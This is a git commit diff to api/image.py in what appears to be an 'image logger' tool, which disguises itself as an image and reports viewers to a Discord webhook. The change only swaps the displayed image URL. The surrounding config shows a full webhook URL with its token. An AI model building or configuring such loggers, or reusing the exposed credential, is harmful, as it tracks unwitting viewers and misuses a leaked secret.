79ec7df4db28ba82ea8245293622f58dcc6f7998
Aarjav-Aashna-Jain <119788809+Aarjav-Aashna-Jain@users.noreply.github.com>
2026-01-02 20:01:13 +0530

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1456654390755725409/Dgke7G74wkFvAyNDhPkKsloGhetPeHFAg6BW8EBf6bjjnrFLvt39-vvMHkKP3kfkkvLW",
-    "image": "https://i.kym-cdn.com/photos/images/original/003/074/729/062.jpeg", # You can also have a custom image by using a URL argument
+    "image": "https://tenor.com/view/sybau-lazer-dim-700-gif-11686320399279541486", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
